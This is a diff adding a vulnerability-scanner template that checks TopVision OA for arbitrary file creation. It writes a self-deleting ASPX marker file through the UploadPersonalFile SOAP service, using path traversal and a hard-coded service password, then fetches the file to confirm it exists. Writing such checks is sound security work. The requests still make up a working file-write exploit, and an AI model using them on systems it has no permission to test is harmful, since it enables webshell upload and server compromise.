@@ -1,0 +1,61 @@
+id: topvision-oa-uploadpersonalfile-file-creation
+
+info:
+  name: TopVision OA UploadPersonalFile File Creation
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    TopVision OA contains a file creation vulnerability that allows attackers to write arbitrary files, potentially leading to server compromise by uploading a webshell.
+  tags: file-creation
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: first-step
+    raw:
+      - |
+        POST /WebService/BasicService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: http://tempuri.org/UploadPersonalFile
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <UploadPersonalFile xmlns="http://tempuri.org/">
+              <fs>PCVAUGFnZSBMYW5ndWFnZT0iQyMiJT4KPCUKUmVzcG9uc2UuV3JpdGUoRm9ybXNBdXRoZW50aWNhdGlvbi5IYXNoUGFzc3dvcmRGb3JTdG9yaW5nSW5Db25maWdGaWxlKCJ0ZXN0MTIzIiwgIk1ENSIpKTsKU3lzdGVtLklPLkZpbGUuRGVsZXRlKFJlcXVlc3QuUGh5c2ljYWxQYXRoKTsKJT4=</fs>
+              <FileName>../../manager/1.aspx</FileName>
+              <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>
+            </UploadPersonalFile>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - UploadPersonalFileResponse
+        part: body
+
+  - id: second-step
+    raw:
+      - |
+        GET /1.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - CC03E747A6AFBBCBF8BE7668ACFEBEE5
+        part: body
+
+variables:
+  cmd: "whoami"
